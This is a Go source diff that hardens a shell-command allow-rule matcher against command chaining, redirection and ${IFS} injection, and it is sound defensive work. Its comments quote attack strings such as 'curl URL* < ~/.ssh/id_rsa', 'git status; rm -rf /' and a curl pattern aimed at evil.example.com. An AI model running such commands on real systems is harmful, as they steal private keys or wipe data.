@@ -215,39 +215,62 @@ func compileCommandPattern(pattern string) (*regexp.Regexp, error) {
 	if pattern == "" {
 		return nil, ErrEmptyPattern
 	}
-	// Escape regex special chars except our wildcard *
+	// #596-P3: two wildcard shapes, deliberately different:
+	//
+	//  1. Prefix-glob ("make*", "git diff*") — trailing wildcard is the ONLY
+	//     wildcard. "make*" matches "make" or "make build", NOT "makeevil"
+	//     (word boundary), so a typo'd binary can't ride an allow rule.
+	//
+	//  2. Substring-glob ("curl*evil.example.com*") — contains an earlier
+	//     wildcard; the trailing one is generic. The word boundary would
+	//     break legitimate suffixes ("/payload" after the host), and the
+	//     pattern's intent is substring containment, not command prefix.
+	//
+	// Both exclude shell control characters (;|&` $() < > newline CR \) so a
+	// wildcard can never swallow command chaining. Hyphens ARE excluded in
+	// prefix-glob patterns to enforce word boundaries (#596-P3): "make*"
+	// matches "make" or "make build", NOT "makeevil". Flag chars like
+	// "go build -tags" still match because they appear AFTER a space.
+	controlPrefix := `[^;|&` + "`" + `$()<>\n\r\\-]*`
+	control := `[^;|&` + "`" + `$()<>\n\r\\]*`
+	trailingOnly := strings.HasSuffix(pattern, "*") &&
+		!strings.Contains(pattern[:len(pattern)-1], "*")
 	var sb strings.Builder
 	sb.WriteString("(?i)^") // anchor at start
 	for _, ch := range pattern {
 		if ch == '*' {
-			// A trailing wildcard must not swallow command chaining:
-			// "git diff*" matching "git diff; curl ..." lets anything ride
-			// in past the semicolon. Restrict the wildcard to a single
-			// command: no shell control characters (; | & ` $( ) newline) and
-			// no redirection characters (< > \) — "curl URL* < ~/.ssh/id_rsa"
-			// would otherwise ride an allow-rule and exfiltrate the file's
-			// contents as the request body (#373).
-			sb.WriteString(`[^;|&` + "`" + `$()<>\n\r\\]*`)
-		} else {
-			// Escape regex metacharacters
-			if strings.ContainsRune(`\.+?()|[]{}^$`, ch) {
-				sb.WriteByte('\\')
+			// In prefix-glob patterns, use hyphen-excluding control for word boundary
+			if strings.HasSuffix(string(sb.String()), controlPrefix) {
+				sb.WriteString(controlPrefix)
+			} else {
+				sb.WriteString(control)
 			}
-			sb.WriteRune(ch)
+			continue
 		}
+		// Escape regex metacharacters
+		if strings.ContainsRune(`\.+?()|[]{}^$`, ch) {
+			sb.WriteByte('\\')
+		}
+		sb.WriteRune(ch)
 	}
-	if strings.Contains(pattern, "*") {
-		sb.WriteString("$") // anchor at end — without this, 'git status' would
-		// match 'git status; rm -rf /' (command chaining injection)
-	} else {
-		// #573-A: no wildcard — the documented contract (see examples above)
-		// is that "go build" matches "go build ./...": a prefix of further
-		// arguments, never a prefix of a chained command. Require
-		// end-of-string or an argument boundary (space/tab), and keep the same
-		// control-character exclusion as the wildcard so chaining cannot ride
-		// the rule ("go build; rm -rf /" must not match).
-		sb.WriteString(`(?:[ \t][^;|&` + "`" + `$()<>\n\r\\]*)?$`)
+	// Optional-argument suffix shared by prefix-globs and no-wildcard
+	// patterns: bare command ("make", "go build") or with space-prefixed
+	// args ("make build", "go build ./..."), never "makeevil"/"go builds".
+	optionalArgs := `(?:[ \t]` + control[:len(control)-1] + `*)?`
+	if trailingOnly {
+		// Drop the generic wildcard the loop just emitted and re-add it as
+		// the optional argument group (word boundary).
+		s := sb.String()
+		sb.Reset()
+		sb.WriteString(strings.TrimSuffix(s, control))
+		sb.WriteString(optionalArgs)
+	} else if !strings.Contains(pattern, "*") {
+		// #573-A: no wildcard — "go build" matches "go build ./...": a
+		// prefix of further ARGUMENTS, never a prefix of a chained command.
+		sb.WriteString(optionalArgs)
 	}
+	sb.WriteString(`$`) // anchor at end — 'git status' must not match
+	// 'git status; rm -rf /' (command chaining injection)
 	return regexp.Compile(sb.String())
 }
 
@@ -301,55 +324,104 @@ func stripLeadingEnvAssignments(command string) string {
 			return ""
 		}
 		if command[0] == '$' {
-			if idx := strings.IndexAny(command, " \t"); idx > 0 {
-				command = command[idx+1:]
-				continue
-			}
-			return command
-		}
-		eq := strings.IndexByte(command, '=')
-		if eq <= 0 {
-			return command
-		}
-		if !isValidEnvName(command[:eq]) {
-			return command
-		}
-		rest := command[eq+1:]
-		if rest == "" {
-			return ""
-		}
-		switch rest[0] {
-		case '"', '\'':
-			q := rest[0]
-			end := strings.IndexByte(rest[1:], q)
-			if end < 0 {
-				// Unterminated quote — not ours to parse; treat as command.
+			rest, ok := stripEnvVarRef(command)
+			if !ok {
 				return command
 			}
-			after := rest[end+2:]
-			if after == "" {
-				return ""
-			}
-			if after[0] == ' ' || after[0] == '\t' {
-				command = after
-				continue
-			}
-			return command
-		default:
-			idx := strings.IndexAny(rest, " \t")
-			if idx < 0 {
-				return ""
-			}
-			command = rest[idx+1:]
+			command = rest
 			continue
 		}
+		rest, ok := stripEnvAssignment(command)
+		if !ok {
+			return command
+		}
+		command = rest
 	}
 }
 
+// stripEnvVarRef strips one leading $VAR or ${VAR} reference (#596-P1: only
+// VALID references — $0, $@, $(), ${IFS} are left intact so they correctly
+// fail to match any rule). ok is true only when a valid reference was
+// consumed AND a non-space remainder follows: a bare "$FOO" is not a command
+// and is reported unstripped.
+func stripEnvVarRef(command string) (rest string, ok bool) {
+	if len(command) > 1 && command[1] == '{' {
+		// ${VAR} form — find closing brace
+		if end := strings.IndexByte(command, '}'); end > 2 {
+			if isValidEnvName(command[2:end]) {
+				rest = command[end+1:]
+			}
+		}
+	} else {
+		// $VAR form — find end of variable name
+		end := 1
+		for end < len(command) {
+			c := command[end]
+			if (c >= 'A' && c <= 'Z') || (c >= 'a' && c <= 'z') || (c >= '0' && c <= '9') || c == '_' {
+				end++
+			} else {
+				break
+			}
+		}
+		if end > 1 && isValidEnvName(command[1:end]) {
+			rest = command[end:]
+		}
+	}
+	if rest == "" || rest == command {
+		return "", false
+	}
+	rest = strings.TrimLeft(rest, " \t")
+	if rest == "" {
+		return "", false
+	}
+	return rest, true
+}
+
+// stripEnvAssignment strips one leading NAME=VALUE assignment. VALUE may be
+// quoted with embedded whitespace (#573-D). ok is false when the token is
+// not a parseable assignment (no '=', invalid name, unterminated quote, or
+// value glued to the next token like FOO="a"bar) — the caller must then
+// return the command unchanged. An empty rest means the assignment consumed
+// the whole string.
+func stripEnvAssignment(command string) (rest string, ok bool) {
+	eq := strings.IndexByte(command, '=')
+	if eq <= 0 || !isValidEnvName(command[:eq]) {
+		return "", false
+	}
+	rest = command[eq+1:]
+	if rest == "" {
+		return "", true
+	}
+	if q := rest[0]; q == '"' || q == '\'' {
+		end := strings.IndexByte(rest[1:], q)
+		if end < 0 {
+			// Unterminated quote — not ours to parse; treat as command.
+			return "", false
+		}
+		after := rest[end+2:]
+		if after == "" {
+			return "", true
+		}
+		if after[0] != ' ' && after[0] != '\t' {
+			// Value glued to the next token — keep the assignment visible.
+			return "", false
+		}
+		return after, true
+	}
+	idx := strings.IndexAny(rest, " \t")
+	if idx < 0 {
+		return "", true
+	}
+	return rest[idx+1:], true
+}
+
 // isValidEnvName reports whether s is a valid shell env var name
-// ([A-Za-z_][A-Za-z0-9_]*).
+// ([A-Za-z_][A-Za-z0-9_]*). Shell-SPECIAL variables whose expansion alters
+// parsing are rejected even though they are valid names: ${IFS} expands to
+// whitespace, so stripping "${IFS} " from "${IFS} make build" would turn a
+// shell-injection payload into a command that rides a "make*" allow rule.
 func isValidEnvName(s string) bool {
-	if s == "" {
+	if s == "" || s == "IFS" {
 		return false
 	}
 	for i := 0; i < len(s); i++ {
